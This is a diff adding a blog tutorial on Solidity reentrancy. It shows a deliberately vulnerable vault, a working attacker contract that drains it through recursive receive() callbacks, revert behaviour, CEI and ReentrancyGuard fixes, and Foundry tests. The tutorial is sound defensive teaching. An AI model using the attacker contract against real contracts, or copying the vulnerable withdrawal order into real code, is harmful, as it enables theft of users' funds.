@@ -1,0 +1,421 @@
+export const metadata = {
+  title: "Solidity Reentrancy Attacks: Execution, Reverts, and Defenses",
+  description:
+    "Trace a Solidity reentrancy attack through the EVM call stack, understand exact revert behavior, and fix it with Checks-Effects-Interactions, ReentrancyGuard, and Foundry tests.",
+  date: "2026-08-20",
+  slug: "solidity-reentrancy-attack",
+  lang: "en",
+  tags: ["solidity", "ethereum", "security", "reentrancy", "foundry", "web3"],
+  draft: false,
+}
+
+A reentrancy attack happens when a contract transfers control to an external address and that address calls back into the contract before the original function has finished updating its state. The callback executes against stale state, potentially allowing repeated withdrawals, bypassed limits, or broken protocol invariants.
+
+Reentrancy is not synonymous with using `call`. The dangerous combination is usually an **external call made before critical state is finalized, while a reentrant entry point can still pass its checks**.
+
+> The code in this article is for local security research and testing only. Never attack contracts, networks, or assets without explicit authorization.
+
+---
+
+## 1. Start with a normal withdrawal
+
+A vault withdrawal normally has three phases:
+
+1. **Checks**: verify that the caller has funds to withdraw
+2. **Effects**: deduct or clear the caller's recorded balance
+3. **Interactions**: transfer ETH to the caller
+
+When that order is followed, the vault's state is already final when the recipient gains control. Even if the recipient calls `withdraw` again, it cannot pass the balance check.
+
+The vulnerable implementation reverses the last two phases:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.28;
+
+contract VulnerableVault {
+    mapping(address account => uint256 amount) public balances;
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() external {
+        uint256 amount = balances[msg.sender];
+        require(amount > 0, "Nothing to withdraw");
+
+        // Bug: control is transferred before state is updated.
+        (bool success, ) = msg.sender.call{value: amount}("");
+        require(success, "ETH transfer failed");
+
+        // This update happens too late.
+        balances[msg.sender] = 0;
+    }
+}
+```
+
+`msg.sender.call{value: amount}("")` invokes the recipient's `receive` or `fallback` function. If the recipient is a contract, it can run arbitrary logic before the call returns, including another call to `withdraw`.
+
+---
+
+## 2. How the attacker reenters
+
+The attacker first deposits 1 ETH to obtain a legitimate recorded balance. Every time it receives ETH, it calls the withdrawal function again:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.28;
+
+interface IVulnerableVault {
+    function deposit() external payable;
+    function withdraw() external;
+}
+
+contract ReentrancyAttacker {
+    IVulnerableVault public immutable vault;
+    address public immutable owner;
+
+    constructor(address vaultAddress) {
+        vault = IVulnerableVault(vaultAddress);
+        owner = msg.sender;
+    }
+
+    function attack() external payable {
+        require(msg.sender == owner, "Not owner");
+        require(msg.value == 1 ether, "Send exactly 1 ether");
+
+        vault.deposit{value: 1 ether}();
+        vault.withdraw();
+    }
+
+    receive() external payable {
+        // Reenter before the preceding withdraw call has returned.
+        if (address(vault).balance >= 1 ether) {
+            vault.withdraw();
+        }
+    }
+
+    function sweep() external {
+        require(msg.sender == owner, "Not owner");
+        (bool success, ) = owner.call{value: address(this).balance}("");
+        require(success, "Sweep failed");
+    }
+}
+```
+
+Assume that other users have already deposited 10 ETH. The attack proceeds as follows:
+
+```text
+Initial: Vault balance = 10 ETH, attacker credit = 0
+  ↓ Attacker.deposit(1 ETH)
+Vault balance = 11 ETH, balances[Attacker] = 1 ETH
+  ↓ Attacker.attack() calls Vault.withdraw()       [frame 1]
+Read balances[Attacker] = 1 ETH
+  ↓ Vault sends 1 ETH to Attacker
+Attacker.receive() gains control
+  ↓ receive() calls Vault.withdraw() again         [frame 2]
+Read balances[Attacker] = 1 ETH again
+  ↓ Send another 1 ETH and enter frame 3
+  ↓ Repeat until the Vault holds less than 1 ETH
+The stack unwinds; every frame finally writes balances[Attacker] = 0
+Final: Vault balance = 0, attacker contract balance = 11 ETH
+```
+
+When frame 2 starts, frame 1 has not yet executed `balances[msg.sender] = 0`. Every reentrant frame reads the same stale 1 ETH balance. Repeatedly writing `0` while the stack unwinds does not recover ETH that has already been transferred.
+
+### EVM call-stack view
+
+```text
+ReentrancyAttacker.attack
+└─ VulnerableVault.withdraw                  # reads 1 ETH
+   └─ ReentrancyAttacker.receive             # receives payment 1
+      └─ VulnerableVault.withdraw            # still reads 1 ETH
+         └─ ReentrancyAttacker.receive       # receives payment 2
+            └─ VulnerableVault.withdraw      # reenters again
+               └─ ...
+```
+
+This is not multithreaded concurrency. The EVM still executes synchronously on a call stack; the target contract is simply entered again while an outer invocation is waiting for an external call to return.
+
+---
+
+## 3. Why an attempted exploit may revert completely
+
+Whether reentrancy succeeds depends not only on the vulnerability, but also on how the deepest call terminates and how each caller handles failure.
+
+### Case 1: a low-level call returns `false` and the caller continues
+
+A low-level call does not automatically revert its caller when the callee reverts. It returns a status and revert data:
+
+```solidity
+(bool success, bytes memory returnData) = target.call(data);
+```
+
+When `success == false`, state changes and ETH transfers made inside the failed callee frame are reverted, but the caller may continue. Ignoring that status often creates a separate accounting bug.
+
+### Case 2: the caller checks failure and reverts
+
+The vulnerable example uses:
+
+```solidity
+require(success, "ETH transfer failed");
+```
+
+If the deepest external call fails, this `require` reverts its current frame. The error can then propagate outward through every frame until the **entire top-level transaction** reverts. Storage writes, events, and ETH transfers made by that transaction return to their pre-transaction values. Gas already spent is not restored.
+
+### Typical concrete failure causes
+
+- The vault lacks enough ETH for the next value transfer
+- The attacker's `receive` function explicitly reverts
+- A reentrancy lock rejects the nested call
+- An inner call triggers a requirement, custom error, arithmetic panic, or other panic
+- Call-depth or gas conditions make an inner call fail
+
+The attacker example stops reentering when `address(vault).balance < 1 ether`, allowing the deepest frame to return normally. Without that condition, the final payment could fail for insufficient funds. The checked `success` value could then revert the whole chain, leaving the attacker with no proceeds and only a gas loss.
+
+> “The inner call failed” and “the whole transaction reverted” are different statements. Failure expands to an outer frame only when it is bubbled or the outer frame responds to `success == false` by reverting again.
+
+| Scenario | Inner result | Top-level result | Rollback scope |
+| --- | --- | --- | --- |
+| Attacker stops before funds run out | Deepest frame returns normally | Transaction succeeds | No rollback; repeated transfers persist |
+| Payment lacks funds and the caller checks `success` | `call` returns `false` | `Error("ETH transfer failed")` | Entire attack transaction |
+| CEI blocks the repeated withdrawal | Inner `NothingToWithdraw()` | Example ends with `EtherTransferFailed()` | Entire withdrawal transaction |
+| `ReentrancyGuard` rejects reentry | Inner `ReentrancyGuardReentrantCall()` | Example ends with `EtherTransferFailed()` | Entire withdrawal transaction |
+| Caller ignores a failed low-level call | `call` returns `false` | Caller may still succeed | Failed callee frame only |
+
+---
+
+## 4. Primary fix: Checks-Effects-Interactions
+
+The direct fix is to clear the balance before sending ETH:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.28;
+
+contract SafeVaultCEI {
+    error NothingToWithdraw();
+    error EtherTransferFailed();
+
+    mapping(address account => uint256 amount) public balances;
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() external {
+        // Checks
+        uint256 amount = balances[msg.sender];
+        if (amount == 0) revert NothingToWithdraw();
+
+        // Effects
+        balances[msg.sender] = 0;
+
+        // Interactions
+        (bool success, ) = msg.sender.call{value: amount}("");
+        if (!success) revert EtherTransferFailed();
+    }
+}
+```
+
+When the attacker receives the first payment and calls `withdraw` again, the nested invocation sees a zero balance and executes:
+
+```solidity
+revert NothingToWithdraw();
+```
+
+If the attacker's `receive` function does not catch that error, the receive call also reverts. The outer low-level call returns `false`, and the vault then executes:
+
+```solidity
+revert EtherTransferFailed();
+```
+
+The entire withdrawal transaction is rolled back:
+
+- `balances[attacker] = 0` is undone, restoring the 1 ETH credit
+- The first 1 ETH transfer to the attacker is undone
+- Events emitted by the transaction are removed
+- The attacker loses only the gas spent by the failed transaction
+
+If the attacker catches the nested error with `try/catch` or a low-level call and lets `receive` return normally, the outer withdrawal may succeed. The attacker still receives only its own 1 ETH once and cannot drain the vault.
+
+---
+
+## 5. Defense in depth: ReentrancyGuard
+
+Checks-Effects-Interactions should remain the basic design rule. Contracts with multiple external calls, complex inheritance, or several entry points sharing state can also use OpenZeppelin's `ReentrancyGuard`:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.28;
+
+import {ReentrancyGuard} from
+    "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
+
+contract SafeVault is ReentrancyGuard {
+    error NothingToWithdraw();
+    error EtherTransferFailed();
+
+    mapping(address account => uint256 amount) public balances;
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() external nonReentrant {
+        uint256 amount = balances[msg.sender];
+        if (amount == 0) revert NothingToWithdraw();
+
+        balances[msg.sender] = 0;
+
+        (bool success, ) = msg.sender.call{value: amount}("");
+        if (!success) revert EtherTransferFailed();
+    }
+}
+```
+
+`nonReentrant` locks its protection domain when the function starts and unlocks it after a normal return. A nested call in that domain triggers this OpenZeppelin 5.x custom error:
+
+```solidity
+error ReentrancyGuardReentrantCall();
+```
+
+If that error crosses the attacker's `receive` function and reaches the low-level call, the vault sees only `success == false`. Because the example then throws `EtherTransferFailed()`, the final error visible to the top-level caller is `EtherTransferFailed()`; this code replaces the inner `ReentrancyGuardReentrantCall()` revert data.
+
+Do not stop reviewing state order after adding a modifier. CEI reduces the exposed intermediate state, while a lock adds another enforcement boundary.
+
+### A common `nonReentrant` limitation
+
+Two `nonReentrant` functions cannot call one another. Put shared behavior in a `private` function and call it from separate `external nonReentrant` entry points:
+
+```solidity
+function withdraw() external nonReentrant {
+    _withdrawTo(payable(msg.sender));
+}
+
+function withdrawTo(address payable recipient) external nonReentrant {
+    _withdrawTo(recipient);
+}
+
+function _withdrawTo(address payable recipient) private {
+    // Checks, state updates, and the external call
+}
+```
+
+---
+
+## 6. Additional defenses
+
+### 1. Pull payments
+
+Separate business settlement from user withdrawal. The protocol records a claimable amount, and users claim through a dedicated entry point. That claim function must still follow CEI and will often benefit from a reentrancy guard.
+
+### 2. Protect against cross-function reentrancy
+
+An attacker does not have to call the same function again. If `withdraw` temporarily breaks a total-assets invariant before an external call, the recipient may invoke `borrow`, `transfer`, or `claimReward` from its callback. Audit protection domains according to shared state, not merely repeated function names.
+
+### 3. Consider read-only reentrancy
+
+Even a `view` function may expose a temporary value while another function's state is inconsistent. External protocols, oracles, or pricing logic can be misled when they consume that value. Locks, snapshots, and maintaining invariants at every callback boundary may all be necessary.
+
+### 4. Do not depend on the 2,300-gas stipend of `transfer` or `send`
+
+Treating `transfer` as a reentrancy defense is brittle. Gas costs may change through EVM upgrades, and a fixed stipend can break compatibility with smart-contract wallets. Modern code commonly uses `call`, checks its result, and relies on CEI, locks, and tests for safety.
+
+### 5. Minimize external interactions and check every result
+
+External interactions include more than ETH transfers. ERC-20 callbacks, ERC-777 hooks, ERC-721/1155 safe transfers, flash-loan callbacks, and arbitrary plugin calls all transfer control to other code and must be treated as potential reentrancy points.
+
+---
+
+## 7. Verify the exploit and rollback with Foundry
+
+Regression tests should prove both that funds cannot be stolen and that failed operations restore state. An `expectRevert` assertion alone is not enough.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.28;
+
+import {Test} from "forge-std/Test.sol";
+import {VulnerableVault} from "../src/VulnerableVault.sol";
+import {SafeVaultCEI} from "../src/SafeVaultCEI.sol";
+import {ReentrancyAttacker} from "../src/ReentrancyAttacker.sol";
+
+contract ReentrancyTest is Test {
+    VulnerableVault internal vulnerable;
+    SafeVaultCEI internal safe;
+    ReentrancyAttacker internal attacker;
+    ReentrancyAttacker internal safeAttacker;
+
+    address internal alice = makeAddr("alice");
+
+    function setUp() public {
+        vulnerable = new VulnerableVault();
+        safe = new SafeVaultCEI();
+
+        vm.deal(alice, 20 ether);
+        vm.prank(alice);
+        vulnerable.deposit{value: 10 ether}();
+
+        vm.prank(alice);
+        safe.deposit{value: 10 ether}();
+
+        attacker = new ReentrancyAttacker(address(vulnerable));
+        safeAttacker = new ReentrancyAttacker(address(safe));
+    }
+
+    function test_ReentrancyDrainsVulnerableVault() public {
+        attacker.attack{value: 1 ether}();
+
+        assertEq(address(vulnerable).balance, 0);
+        assertEq(address(attacker).balance, 11 ether);
+        assertEq(vulnerable.balances(address(attacker)), 0);
+    }
+
+    function test_SafeVaultRevertsAndRestoresAllState() public {
+        uint256 vaultBalanceBefore = address(safe).balance;
+        uint256 attackerBalanceBefore = address(safeAttacker).balance;
+
+        vm.expectRevert(SafeVaultCEI.EtherTransferFailed.selector);
+        safeAttacker.attack{value: 1 ether}();
+
+        // deposit and withdraw are in one top-level transaction, so both revert.
+        assertEq(address(safe).balance, vaultBalanceBefore);
+        assertEq(address(safeAttacker).balance, attackerBalanceBefore);
+        assertEq(safe.balances(address(safeAttacker)), 0);
+    }
+}
+```
+
+In the second test, `attack{value: 1 ether}()` calls `deposit` and then `withdraw` within one top-level transaction. When the later withdrawal reverts, the preceding deposit is reverted too. The safe vault remains at 10 ETH and the attacker contract's recorded credit remains zero.
+
+A production test suite should also cover:
+
+- A normal EOA successfully withdrawing
+- A malicious receiver catching the nested error and receiving only one payment
+- Cross-function reentrancy between two entry points sharing balances
+- Fuzz tests proving that vault assets cover all recorded user balances
+- Invariant tests preserving asset and accounting consistency after arbitrary call sequences
+
+---
+
+## 8. Security review checklist
+
+For every external call site, verify that:
+
+1. Permissions, balances, nonces, and limits are checked before the call
+2. Critical state reaches its final value before the call
+3. A callback cannot enter the same function or another function sharing state
+4. A low-level call failure causes a deliberate revert, retry, or other safe outcome
+5. Custom errors and revert data propagate as intended
+6. ETH, storage, and events all return to their expected values after failure
+7. ERC-777, safe NFT transfers, flash loans, or other implicit callbacks are covered
+8. Reentrancy-lock state and storage layout are correct in upgradeable contracts
+
+---
+
+## Summary
+
+The core of a reentrancy attack is not recursion itself. It is external code regaining execution while a contract exposes an exploitable intermediate state. The vulnerable vault transfers ETH before clearing its balance, so every nested frame reads the same stale value. The fixed vault updates state first, causing a nested call to throw `NothingToWithdraw()`. The outer frame observes the failed call, throws `EtherTransferFailed()`, and rolls the transaction back.
+
+Production contracts should combine Checks-Effects-Interactions, `ReentrancyGuard`, minimal external interactions, strict return-value handling, and tests covering both success and failure paths. Safety comes from preserving invariants at every callback boundary, not from relying on a single modifier.
